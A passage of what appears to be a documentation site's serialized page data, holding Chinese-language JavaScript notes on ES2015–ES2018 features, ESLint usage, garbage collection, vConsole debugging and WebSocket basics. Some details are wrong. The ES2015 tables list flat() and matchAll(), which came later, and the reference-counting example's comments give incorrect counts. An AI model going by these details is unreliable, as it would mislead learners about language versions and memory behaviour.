ES2018 新特性",content:"# ECMAScript新特性\n\n> JavaScript（ECMAScript）是跨多个平台的许多厂商实施的不断发展的标准。ES6（ECMAScript 2015）花费六年的时间敲定，是一个很大的发行版。新的年度发布流程被制定，以简化流程并更快地添加功能。 ES9（ES2018）是撰写本文时的最新版本。\n\n\n# ECMAScript版本\n\n从ECMAScript2016开始，ECMAScript将进入每年发布一次新标准的阶段。\n\nES1    ES2    ES3    ES4   ES5    ES5.1   ES2015(ES6)   ES2016   ES2017   ES2018   ES2019   ...\n1997   1998   1999   夭折    2009   2011    2015          2016     2017     2018     2019     ....\n\n\n# ES2015 新特性\n\n> ES2015发布时间 2015.06\n\n数据\n\n类型           描述\nlet          声明块级作用域{}变量\nconst        声明常量\nSymbol数据类型   Map Set数据类型\n\n字符串扩展\n\n类型             描述\n模板字符串          字符串的for...of遍历\nincludes()     判断一个字符串是否包含在另一个字符串中\nstartsWith()   判断一个字符串是否包含在另一个字符串开头\nendsWith()     判断一个字符串是否包含在另一个字符串末尾\nrepeat()       将字符串重复n次\nmatchAll()     -\n\n数值扩展\n\n类型                   描述\n进制数前缀                二进制数值前缀0b（或0B）和八进制数值前缀0o（或0O）\nNumber.isFinite()    判断一个值是否是有限Infinity\nNumber.isNaN()       判断一个值是否是NaN\nNumber.isInteger()   判断一个值是否是整数\nNumber.isNaN()       判断一个值是否是NaN\nMath.trunc()         删除一个数的小数部分\nMath.sign()          判断一个数到底是正数、负数、还是零\n\n函数扩展\n\n类型                           描述\n函数参数默认值function(a=0,b=0){}   ...rest参数接收函数参数\n函数的name属性，获得该函数的函数名          箭头函数\n\n数组扩展\n\n类型                                     描述\n...                                    扩展运算符\nArray.from()                           将符合格式的对象转化为数组\nArray.of()                             将符合格式的对象转化为数组\nfind()                                 找出第一个符合条件的数组成员\nfindIndex()                            找出第一个符合条件的数组成员的下标\ncopyWithin()                           指定位置的成员复制到其他位置\nflat()                                 将多维数组变成一维的数组\n数组的遍历：entries()键值对 keys()键 values()值   \nfill()                                 使用给定值，填充一个数组\n\n对象扩展\n\n类型                                                           描述\n属性方法的简写                                                      方法的name属性\n属性名表达式，用字面量定义对象属性方法名                                         对象的解构赋值\n类 class与类的继承extends                                          Object.is()比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致\nObject.assign()对象的合并                                         Object.is()比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致\nObject.keys() Object.values() Object.entries()遍历对象的键、值、键值对   for...of对象遍历\nIterator遍历器                                                  \n\n其他\n\n类型                 描述\nPromise对象，用于异步编程   Generator函数\nEs module          ES6模块化\n\n\n# ES2016 新特性\n\n> 2016.06\n\n运算符扩展\n\n类型   描述\n**   指数运算符\n\n数组扩展\n\n类型           描述\nincludes()   检查数组是否包含某元素\n\n\n# ES2017 新特性\n\n> 2017.06\n\n字符串扩展\n\n                                 \npadStart()用某字符串在目标字符串开头补全到指定长度   padEnd()用某字符串在目标字符串末尾补全到指定长度\n\n对象扩展\n\n                                                             \nObject.values()对象的遍历，得到对象的可遍历的属性值组成的数组                       Object.entries()对象的遍历，得到对象的可遍历的属性名与属性值组成的数组\nObject.getOwnPropertyDescriptors()返回指定对象所有自身属性（非继承属性）的描述对象   \n\n函数扩展\n\n\n函数实参和形参中的尾随逗号\n\n异步编程\n\n\nasync await 异步函数\n\n\n# ES2018 新特性\n\nES2018 是 ECMAScript 标准的最新版本，\n\n对象扩展\n\n               \n对象的Rest扩展运算符   Promise.prototype.finally()Promise方法",normalizedContent:"# ecmascript新特性\n\n> javascript（ecmascript）是跨多个平台的许多厂商实施的不断发展的标准。es6（ecmascript 2015）花费六年的时间敲定，是一个很大的发行版。新的年度发布流程被制定，以简化流程并更快地添加功能。 es9（es2018）是撰写本文时的最新版本。\n\n\n# ecmascript版本\n\n从ecmascript2016开始，ecmascript将进入每年发布一次新标准的阶段。\n\nes1    es2    es3    es4   es5    es5.1   es2015(es6)   es2016   es2017   es2018   es2019   ...\n1997   1998   1999   夭折    2009   2011    2015          2016     2017     2018     2019     ....\n\n\n# es2015 新特性\n\n> es2015发布时间 2015.06\n\n数据\n\n类型           描述\nlet          声明块级作用域{}变量\nconst        声明常量\nsymbol数据类型   map set数据类型\n\n字符串扩展\n\n类型             描述\n模板字符串          字符串的for...of遍历\nincludes()     判断一个字符串是否包含在另一个字符串中\nstartswith()   判断一个字符串是否包含在另一个字符串开头\nendswith()     判断一个字符串是否包含在另一个字符串末尾\nrepeat()       将字符串重复n次\nmatchall()     -\n\n数值扩展\n\n类型                   描述\n进制数前缀                二进制数值前缀0b（或0b）和八进制数值前缀0o（或0o）\nnumber.isfinite()    判断一个值是否是有限infinity\nnumber.isnan()       判断一个值是否是nan\nnumber.isinteger()   判断一个值是否是整数\nnumber.isnan()       判断一个值是否是nan\nmath.trunc()         删除一个数的小数部分\nmath.sign()          判断一个数到底是正数、负数、还是零\n\n函数扩展\n\n类型                           描述\n函数参数默认值function(a=0,b=0){}   ...rest参数接收函数参数\n函数的name属性，获得该函数的函数名          箭头函数\n\n数组扩展\n\n类型                                     描述\n...                                    扩展运算符\narray.from()                           将符合格式的对象转化为数组\narray.of()                             将符合格式的对象转化为数组\nfind()                                 找出第一个符合条件的数组成员\nfindindex()                            找出第一个符合条件的数组成员的下标\ncopywithin()                           指定位置的成员复制到其他位置\nflat()                                 将多维数组变成一维的数组\n数组的遍历：entries()键值对 keys()键 values()值   \nfill()                                 使用给定值，填充一个数组\n\n对象扩展\n\n类型                                                           描述\n属性方法的简写                                                      方法的name属性\n属性名表达式，用字面量定义对象属性方法名                                         对象的解构赋值\n类 class与类的继承extends                                          object.is()比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致\nobject.assign()对象的合并                                         object.is()比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致\nobject.keys() object.values() object.entries()遍历对象的键、值、键值对   for...of对象遍历\niterator遍历器                                                  \n\n其他\n\n类型                 描述\npromise对象，用于异步编程   generator函数\nes module          es6模块化\n\n\n# es2016 新特性\n\n> 2016.06\n\n运算符扩展\n\n类型   描述\n**   指数运算符\n\n数组扩展\n\n类型           描述\nincludes()   检查数组是否包含某元素\n\n\n# es2017 新特性\n\n> 2017.06\n\n字符串扩展\n\n                                 \npadstart()用某字符串在目标字符串开头补全到指定长度   padend()用某字符串在目标字符串末尾补全到指定长度\n\n对象扩展\n\n                                                             \nobject.values()对象的遍历，得到对象的可遍历的属性值组成的数组                       object.entries()对象的遍历，得到对象的可遍历的属性名与属性值组成的数组\nobject.getownpropertydescriptors()返回指定对象所有自身属性（非继承属性）的描述对象   \n\n函数扩展\n\n\n函数实参和形参中的尾随逗号\n\n异步编程\n\n\nasync await 异步函数\n\n\n# es2018 新特性\n\nes2018 是 ecmascript 标准的最新版本，\n\n对象扩展\n\n               \n对象的rest扩展运算符   promise.prototype.finally()promise方法",charsets:{cjk:!0}},{title:"ESLint 代码检查",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/ESLint%20%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5.html",relativePath:"Javascript/Javascript扩展操作/ESLint 代码检查.md",key:"v-028107c2",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/ESLint%20%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5.html",headers:[{level:3,title:"安装 ESLint",slug:"安装-eslint",normalizedTitle:"安装 eslint",charIndex:234},{level:3,title:"配置",slug:"配置",normalizedTitle:"配置",charIndex:393},{level:3,title:"检查规则释义",slug:"检查规则释义",normalizedTitle:"检查规则释义",charIndex:946},{level:3,title:"执行检查",slug:"执行检查",normalizedTitle:"执行检查",charIndex:1236}],headersStr:"安装 ESLint 配置 检查规则释义 执行检查",content:'# ESLint 代码检查\n\n在协同开发过程中，每个人都有独立的编码习惯，虽然团队可以通过制定强制执行的规范来保持大家代码风格的尽量一致。但是，在实际编码过程中，个人可能会不经意地继续使用着自己的代码风格，而等到发现不一致再解决又未免有点迟。\n\n> ESLint是一款当前应用十分广泛的JavaScript代码检查工具，使用 Node.js 编写。ESLint 的初衷是为了让程序员可以创建自己的检测规则，使其可以在编码的过程中发现问题而不是在执行的过程中。\n\n\n# 安装 ESLint\n\n如果仅仅想让 ESLint 成为你项目构建系统的一部分，我们可以在项目根目录进行本地安装：\n\n$ npm install eslint --save-dev\n\n\n如果想使 ESLint 适用于所有的项目，建议使用全局安装，使用全局安装 ESLint 后，你使用的任何 ESLint 插件或可分享的配置也都必须在全局安装。\n\n$ npm install -g eslint\n\n\n监测是否下载成功\n\n$ eslint -v    # v4.15.0\n\n\n\n# 配置\n\n如果我们要使用ESLint来检查自己的日常JavaScript代码，而并非在项目中使用的话，可以使用eslint --init命令来在全局生成一个规则配置文件。\n\neslint --init命令会以命令行选择交互的方式来生成这个规则文件。在输入命令后，会得到如下的结果：\n\n? How would you like to configure ESLint? (Use arrow keys)\n> Answer questions about your style\n  Use a popular style guide\n  Inspect your JavaScript file(s)\n\n\n 1. Answer questions about your style* 通过回答问题来生成规则文件\n 2. Use a popular style guide* 使用已经配置好的流行的规则(别人推荐的最佳实践)\n 3. Inspect your JavaScript file(s)* 检查现有的JavaScript文件来自动生成\n\n\n# 检查规则释义\n\n.eslintrc.js文件生成后，rules部分整体是一个json对象。键是规则的名字，值是关于此规则的配置。\n\n关于每条规则名称的具体含义，我们可以通过其中文意思进行理解，或者查看ESLint官方Rules介绍文档。\n\n而配置则都由这些值开始：\n\n* "off" 或者0 - 代表关闭此条规则，即不做关于此规则的检测。\n* "warn" 或者 1 - 将此条规则设置为需要进行warning警告的规则，eslint程序的返回码不变。\n* "error" 或者 2 - 将此条规则设置为需要进行error报错的规则，eslint程序的返回码将变为1。\n\n\n\n# 执行检查\n\n检测单个文件\n\n$ eslint yourfile.js\n\n\n检测多个文件\n\n$ eslint foo.js bar.js\n\n\n检测目录下所有文件\n这里可以指定格式，因为ESLint不止可以检查js文件。\n\n$ eslint your_directory/**.js\n\n\n检测目录\n\n$ eslint directory_name [directory_name2]\n\n\n# VSCode 中使用ESLint： VScode格式化ESlint-方法\n\n> 参考资料：使用ESLint进行JavaScript代码检查',normalizedContent:'# eslint 代码检查\n\n在协同开发过程中，每个人都有独立的编码习惯，虽然团队可以通过制定强制执行的规范来保持大家代码风格的尽量一致。但是，在实际编码过程中，个人可能会不经意地继续使用着自己的代码风格，而等到发现不一致再解决又未免有点迟。\n\n> eslint是一款当前应用十分广泛的javascript代码检查工具，使用 node.js 编写。eslint 的初衷是为了让程序员可以创建自己的检测规则，使其可以在编码的过程中发现问题而不是在执行的过程中。\n\n\n# 安装 eslint\n\n如果仅仅想让 eslint 成为你项目构建系统的一部分，我们可以在项目根目录进行本地安装：\n\n$ npm install eslint --save-dev\n\n\n如果想使 eslint 适用于所有的项目，建议使用全局安装，使用全局安装 eslint 后，你使用的任何 eslint 插件或可分享的配置也都必须在全局安装。\n\n$ npm install -g eslint\n\n\n监测是否下载成功\n\n$ eslint -v    # v4.15.0\n\n\n\n# 配置\n\n如果我们要使用eslint来检查自己的日常javascript代码，而并非在项目中使用的话，可以使用eslint --init命令来在全局生成一个规则配置文件。\n\neslint --init命令会以命令行选择交互的方式来生成这个规则文件。在输入命令后，会得到如下的结果：\n\n? how would you like to configure eslint? (use arrow keys)\n> answer questions about your style\n  use a popular style guide\n  inspect your javascript file(s)\n\n\n 1. answer questions about your style* 通过回答问题来生成规则文件\n 2. use a popular style guide* 使用已经配置好的流行的规则(别人推荐的最佳实践)\n 3. inspect your javascript file(s)* 检查现有的javascript文件来自动生成\n\n\n# 检查规则释义\n\n.eslintrc.js文件生成后，rules部分整体是一个json对象。键是规则的名字，值是关于此规则的配置。\n\n关于每条规则名称的具体含义，我们可以通过其中文意思进行理解，或者查看eslint官方rules介绍文档。\n\n而配置则都由这些值开始：\n\n* "off" 或者0 - 代表关闭此条规则，即不做关于此规则的检测。\n* "warn" 或者 1 - 将此条规则设置为需要进行warning警告的规则，eslint程序的返回码不变。\n* "error" 或者 2 - 将此条规则设置为需要进行error报错的规则，eslint程序的返回码将变为1。\n\n\n\n# 执行检查\n\n检测单个文件\n\n$ eslint yourfile.js\n\n\n检测多个文件\n\n$ eslint foo.js bar.js\n\n\n检测目录下所有文件\n这里可以指定格式，因为eslint不止可以检查js文件。\n\n$ eslint your_directory/**.js\n\n\n检测目录\n\n$ eslint directory_name [directory_name2]\n\n\n# vscode 中使用eslint： vscode格式化eslint-方法\n\n> 参考资料：使用eslint进行javascript代码检查',charsets:{cjk:!0}},{title:"JavaScript垃圾回收机制",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/JavaScript%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.html",relativePath:"Javascript/Javascript扩展操作/JavaScript垃圾回收机制.md",key:"v-3b3c3f18",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/JavaScript%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.html",headers:[{level:2,title:"两种实现方式",slug:"两种实现方式",normalizedTitle:"两种实现方式",charIndex:200},{level:3,title:"1.标记清除法",slug:"_1-标记清除法",normalizedTitle:"1.标记清除法",charIndex:512},{level:3,title:"2.引用计数法",slug:"_2-引用计数法",normalizedTitle:"2.引用计数法",charIndex:892},{level:2,title:"参考",slug:"参考",normalizedTitle:"参考",charIndex:1331}],headersStr:"两种实现方式 1.标记清除法 2.引用计数法 参考",content:"# JavaScript垃圾回收机制\n\nJavascript具有自动垃圾回收机制(GC:Garbage Collecation)。\n\n原理：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。\n\nJavaScript垃圾回收的机制很简单：找出不再使用的变量，然后释放掉其占用的内存，但是这个过程不是实时的，因为其开销比较大，所以垃圾回收器会按照固定的时间间隔周期性的执行。\n\n\n# 两种实现方式\n\n函数中的局部变量的生命周期：局部变量只在函数执行的过程中存在。而在这个过程中，会为局部变量在栈（或堆）内存上分配相应的空间，以便存储它们的值。然后在函数中使用这些变量，直至函数执行结束。此时，局部变量就没有存在的必要了，因此可以释放它们的内存以供将来使用。在这种情况下，很容易判断变量是否还有存在的必要；但并非所有情况下都这么容易就能得出结论。垃圾回收器必须跟踪哪个变量有用，哪个变量没用，对于不再有用的变量打上标记，以备将来收回其占用的内存。用于标识无用变量的策略可能会因实现而异，但具体到浏览器中的实现。\n\n通常情况下有两种实现方式：标记清除 和 引用计数。引用计数不太常用，标记清除较为常用。\n\n\n# 1.标记清除法\n\n在函数声明一个变量的时候，就将这个变量标记为“进入环境”。从逻辑上讲，永远都不能释放进入环境的变量作占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。垃圾回收器在运行时候会给存储在内存中中的所有变量都加上标记。然后它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。在此之后再被标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清楚工作，销毁那些带标记的值并回收他们所占用的内存空间。\n\n\nfunction\n\ntest(){\n\n var a = 10 ; //被标记 ，进入环境\n\n var b = 20 ; //被标记 ，进入环境\n\n}\n\ntest(); //执行完毕 之后 a、b又被标离开环境，被回收。\n\n\n\n\n# 2.引用计数法\n\n引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。\n\n但是很重要的一点是当遇到循环引用的时候，函数的引用次数就不会为0，所以不会被垃圾回收器回收内存，会造成内存泄露。在IE中涉及COM对象，就会存在循环引用的问题。\n\n\nfunction\n\ntest(){\n\n var a = {} ; //a的引用次数为0\n\n var b = a ; //a的引用次数加1，为1\n\n var c =a; //a的引用次数再加1，为2\n\n var b ={}; //a的引用次数减1，为1\n\n}\n\n\n\n\n# 参考\n\n * https://blog.csdn.net/OLiver_web/article/details/53957021\n * ",normalizedContent:"# javascript垃圾回收机制\n\njavascript具有自动垃圾回收机制(gc:garbage collecation)。\n\n原理：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。\n\njavascript垃圾回收的机制很简单：找出不再使用的变量，然后释放掉其占用的内存，但是这个过程不是实时的，因为其开销比较大，所以垃圾回收器会按照固定的时间间隔周期性的执行。\n\n\n# 两种实现方式\n\n函数中的局部变量的生命周期：局部变量只在函数执行的过程中存在。而在这个过程中，会为局部变量在栈（或堆）内存上分配相应的空间，以便存储它们的值。然后在函数中使用这些变量，直至函数执行结束。此时，局部变量就没有存在的必要了，因此可以释放它们的内存以供将来使用。在这种情况下，很容易判断变量是否还有存在的必要；但并非所有情况下都这么容易就能得出结论。垃圾回收器必须跟踪哪个变量有用，哪个变量没用，对于不再有用的变量打上标记，以备将来收回其占用的内存。用于标识无用变量的策略可能会因实现而异，但具体到浏览器中的实现。\n\n通常情况下有两种实现方式：标记清除 和 引用计数。引用计数不太常用，标记清除较为常用。\n\n\n# 1.标记清除法\n\n在函数声明一个变量的时候，就将这个变量标记为“进入环境”。从逻辑上讲，永远都不能释放进入环境的变量作占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。垃圾回收器在运行时候会给存储在内存中中的所有变量都加上标记。然后它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。在此之后再被标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清楚工作，销毁那些带标记的值并回收他们所占用的内存空间。\n\n\nfunction\n\ntest(){\n\n var a = 10 ; //被标记 ，进入环境\n\n var b = 20 ; //被标记 ，进入环境\n\n}\n\ntest(); //执行完毕 之后 a、b又被标离开环境，被回收。\n\n\n\n\n# 2.引用计数法\n\n引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。\n\n但是很重要的一点是当遇到循环引用的时候，函数的引用次数就不会为0，所以不会被垃圾回收器回收内存，会造成内存泄露。在ie中涉及com对象，就会存在循环引用的问题。\n\n\nfunction\n\ntest(){\n\n var a = {} ; //a的引用次数为0\n\n var b = a ; //a的引用次数加1，为1\n\n var c =a; //a的引用次数再加1，为2\n\n var b ={}; //a的引用次数减1，为1\n\n}\n\n\n\n\n# 参考\n\n * https://blog.csdn.net/oliver_web/article/details/53957021\n * ",charsets:{cjk:!0}},{title:"移动端js调试 (vConsole)",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/%E7%A7%BB%E5%8A%A8%E7%AB%AFjs%E8%B0%83%E8%AF%95.html",relativePath:"Javascript/Javascript基础语法/12-错误调试/移动端js调试.md",key:"v-f7191182",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/%E7%A7%BB%E5%8A%A8%E7%AB%AFjs%E8%B0%83%E8%AF%95.html",headers:[{level:2,title:"移动端js调试 (vConsole)",slug:"移动端js调试-vconsole",normalizedTitle:"移动端js调试 (vconsole)",charIndex:2},{level:3,title:"安装",slug:"安装",normalizedTitle:"安装",charIndex:194},{level:3,title:"使用方法",slug:"使用方法",normalizedTitle:"使用方法",charIndex:726},{level:3,title:"打印日志",slug:"打印日志",normalizedTitle:"打印日志",charIndex:975},{level:3,title:"内置插件",slug:"内置插件",normalizedTitle:"内置插件",charIndex:1501},{level:2,title:"浏览器断点使用",slug:"浏览器断点使用",normalizedTitle:"浏览器断点使用",charIndex:1753}],headersStr:"移动端js调试 (vConsole) 安装 使用方法 打印日志 内置插件 浏览器断点使用",content:"# 移动端js调试 (vConsole)\n\n> 平时在web应用开发过程中，我们可以console.log去输出一些信息，但是在移动端，也就是在手机上，console.log的信息我们是看不到的。如果将console.log应用到移动端呢？则需要借助第三方插件：vConsole\n\n> 原理：改写了console.log,重写了实现，用vConsole代理\n\nnpm官网使用教程\n\n\n# 安装\n\n# 1.下载模块\n\n下载 vConsole 的最新版本。\n\n或者使用 npm 安装：\n\nnpm install vconsole\n\n\n然后复制 dist/vconsole.min.js 到自己的项目中。\n\n# 2.引入模块\n\n(1) 如果未使用 AMD/CMD 规范，可直接在 HTML 中引入 vConsole 模块。为了便于后续扩展，建议在 <head> 中引入：\n\n<head>\n  <script src=\"path/to/vconsole.min.js\"><\/script>\n  <script>\n    var vConsole = new VConsole();\n  <\/script>\n</head>\n\n\n(2) 如果使用了 AMD/CMD 规范，可在 module 内使用 require() 引入模块：\n\nvar VConsole = require('path/to/vconsole.min.js');\nvar vConsole = new VConsole();\n\n\n请注意，VConsole 只是 vConsole 的原型，而非一个已实例化的对象。所以在手动 new 实例化之前，vConsole 不会被插入到网页中。\n\n\n# 使用方法\n\n# 初始化 & 配置\n\n引入后, 需要手动初始化 vConsole：\n\nvar vConsole = new VConsole(option);\n\n\noption 是一个选填的 object 对象，具体配置定义请参阅 公共属性及方法。\n\n使用 setOption() 来更新 option：\n\nvConsole.setOption('maxLogNumber', 5000);\n// 或者：\nvConsole.setOption({maxLogNumber: 5000});\n\n\n\n# 打印日志\n\n与 PC 端打印 log 一致，可直接使用 console.log() 等方法直接打印日志：\n\nconsole.log('Hello World');\n\n\n未加载 vConsole 模块时，console.log() 会直接打印到原生控制台中；加载 vConsole 后，日志会打印到页面前端+原生控制台。\n\n# 日志类型\n\n支持 5 种不同类型的日志，会以不同的颜色输出到前端面板：\n\nconsole.log('foo');   // 白底黑字\nconsole.info('bar');  // 白底紫字\nconsole.debug('oh');  // 白底黄字\nconsole.warn('foo');  // 黄底黄字\nconsole.error('bar'); // 红底红字\n\n\n# 特殊格式\n\n支持使用 [system] 作为第一个参数，来将 log 输出到 System 面板：\n\nconsole.log('[system]', 'foo'); // 'foo' 会输出到 System 面板\nconsole.log('[system] bar'); // 这行日志会输出到 Log 面板而非 System 面板\n\n\n\n# 内置插件\n\n# Network 网络\n\n所有 XMLHttpRequest 请求都会被显示到 Network tab 中。\n\n若不希望一个请求显示在面板中，可添加属性 _noVConsole = true 到 XHR 对象中：\n\nvar xhr = new XMLHttpRequest();\nxhr._noVConsole = true; // 不会显示到 tab 中\nxhr.open(\"GET\", 'http://example.com/');\nxhr.send();\n\n\n前往：文档索引\n\n\n# 浏览器断点使用\n\njs断点调试心得\n\n使用VSCode 断点调试 js项目，html页面",normalizedContent:"# 移动端js调试 (vconsole)\n\n> 平时在web应用开发过程中，我们可以console.log去输出一些信息，但是在移动端，也就是在手机上，console.log的信息我们是看不到的。如果将console.log应用到移动端呢？则需要借助第三方插件：vconsole\n\n> 原理：改写了console.log,重写了实现，用vconsole代理\n\nnpm官网使用教程\n\n\n# 安装\n\n# 1.下载模块\n\n下载 vconsole 的最新版本。\n\n或者使用 npm 安装：\n\nnpm install vconsole\n\n\n然后复制 dist/vconsole.min.js 到自己的项目中。\n\n# 2.引入模块\n\n(1) 如果未使用 amd/cmd 规范，可直接在 html 中引入 vconsole 模块。为了便于后续扩展，建议在 <head> 中引入：\n\n<head>\n  <script src=\"path/to/vconsole.min.js\"><\/script>\n  <script>\n    var vconsole = new vconsole();\n  <\/script>\n</head>\n\n\n(2) 如果使用了 amd/cmd 规范，可在 module 内使用 require() 引入模块：\n\nvar vconsole = require('path/to/vconsole.min.js');\nvar vconsole = new vconsole();\n\n\n请注意，vconsole 只是 vconsole 的原型，而非一个已实例化的对象。所以在手动 new 实例化之前，vconsole 不会被插入到网页中。\n\n\n# 使用方法\n\n# 初始化 & 配置\n\n引入后, 需要手动初始化 vconsole：\n\nvar vconsole = new vconsole(option);\n\n\noption 是一个选填的 object 对象，具体配置定义请参阅 公共属性及方法。\n\n使用 setoption() 来更新 option：\n\nvconsole.setoption('maxlognumber', 5000);\n// 或者：\nvconsole.setoption({maxlognumber: 5000});\n\n\n\n# 打印日志\n\n与 pc 端打印 log 一致，可直接使用 console.log() 等方法直接打印日志：\n\nconsole.log('hello world');\n\n\n未加载 vconsole 模块时，console.log() 会直接打印到原生控制台中；加载 vconsole 后，日志会打印到页面前端+原生控制台。\n\n# 日志类型\n\n支持 5 种不同类型的日志，会以不同的颜色输出到前端面板：\n\nconsole.log('foo');   // 白底黑字\nconsole.info('bar');  // 白底紫字\nconsole.debug('oh');  // 白底黄字\nconsole.warn('foo');  // 黄底黄字\nconsole.error('bar'); // 红底红字\n\n\n# 特殊格式\n\n支持使用 [system] 作为第一个参数，来将 log 输出到 system 面板：\n\nconsole.log('[system]', 'foo'); // 'foo' 会输出到 system 面板\nconsole.log('[system] bar'); // 这行日志会输出到 log 面板而非 system 面板\n\n\n\n# 内置插件\n\n# network 网络\n\n所有 xmlhttprequest 请求都会被显示到 network tab 中。\n\n若不希望一个请求显示在面板中，可添加属性 _novconsole = true 到 xhr 对象中：\n\nvar xhr = new xmlhttprequest();\nxhr._novconsole = true; // 不会显示到 tab 中\nxhr.open(\"get\", 'http://example.com/');\nxhr.send();\n\n\n前往：文档索引\n\n\n# 浏览器断点使用\n\njs断点调试心得\n\n使用vscode 断点调试 js项目，html页面",charsets:{cjk:!0}},{title:"WebSocket",frontmatter:{},regularPath:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/WebSocket.html",relativePath:"Javascript/Javascript扩展操作/WebSocket.md",key:"v-21d491c4",path:"/Javascript/Javascript%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C/WebSocket.html",headers:[{level:2,title:"解决的问题",slug:"解决的问题",normalizedTitle:"解决的问题",charIndex:142},{level:2,title:"WebSocket 如何工作",slug:"websocket-如何工作",normalizedTitle:"websocket 如何工作",charIndex:499},{level:2,title:"WebSocket在客户端实现",slug:"websocket在客户端实现",normalizedTitle:"websocket在客户端实现",charIndex:696},{level:3,title:"客户端",slug:"客户端",normalizedTitle:"客户端",charIndex:197},{level:2,title:"WebSocket在服务器端实现",slug:"websocket在服务器端实现",normalizedTitle:"websocket在服务器端实现",charIndex:1766},{level:3,title:"Nodejs",slug:"nodejs",normalizedTitle:"nodejs",charIndex:1835},{level:2,title:"案例",slug:"案例",normalizedTitle:"案例",charIndex:2470}],headersStr:"解决的问题 WebSocket 如何工作 WebSocket在客户端实现 客户端 WebSocket在服务器端实现 Nodejs 案例",content:"# WebSocket\n\nWebSocket 是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。\n\nWebsocket 其实是一个新协议，跟 HTTP 协议基本没有关系，只是为了兼容现有浏览器的握手规范而已，也就是说它是 HTTP 协议上的一种补充。\n\n\n# 解决的问题\n\nHTTP 协议是一种无状态的、无连接的、单向的应用层协议。它采用了请求/响应模型。通信请求只能由客户端发起，服务端对请求做出应答处理。\n\n这种通信模型有一个弊端：HTTP 协议无法实现服务器主动向客户端发起消息。\n\n这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。大多数 Web 应用程序将通过频繁的异步JavaScript和XML（AJAX）请求实现长轮询。轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。\n\nWebSocket使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在WebSocket API中，浏览器和服务器只需要完成一次握手，两者之间就直接可以创建持久性的连接，并进行双向数据传输。\n\n\n# WebSocket 如何工作\n\nWeb浏览器和服务器都必须实现 WebSockets 协议来建立和维护连接。由于 WebSockets 连接长期存在，与典型的HTTP连接不同，对服务器有重要的影响。\n\n基于多线程或多进程的服务器无法适用于 WebSockets，因为它旨在打开连接，尽可能快地处理请求，然后关闭连接。任何实际的 WebSockets 服务器端实现都需要一个异步服务器。\n\n\n# WebSocket在客户端实现\n\n在客户端，没有必要为 WebSockets 使用 JavaScript 库。实现 WebSockets 的 Web 浏览器将通过 WebSockets 对象公开所有必需的客户端功能（主要指支持 Html5 的浏览器）。\n\n\n# 客户端\n\n创建 WebSocket 对象\n\nvar Socket = new WebSocket(url, [protocol] );\n\n\n第一个参数 url, 指定连接的 URL。第二个参数 protocol 是可选的，指定了可接受的子协议。\n\n# WebSocket 属性\n\n属性               描述\nreadyState       只读属性 readyState 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 -\n                 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。\nbufferedAmount   只读属性 bufferedAmount 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8\n                 文本字节数。\n\n# WebSocket 方法\n\n方法名     描述\nsend    使用连接发送数据\nclose   关闭连接\n\n# WebSocket 事件\n\n事件名称      描述\nopen      连接建立时触发\nmessage   客户端接收服务端数据时触发\nerror     通信发生错误时触发\nclose     连接关闭时触发\n\n// 初始化一个 WebSocket 对象\nvar ws = new WebSocket(\"ws://localhost:9998/echo\");\n\n// 建立 web socket 连接成功触发事件\nws.onopen = function () {\n  // 使用 send() 方法发送数据\n  ws.send(\"发送数据\");\n  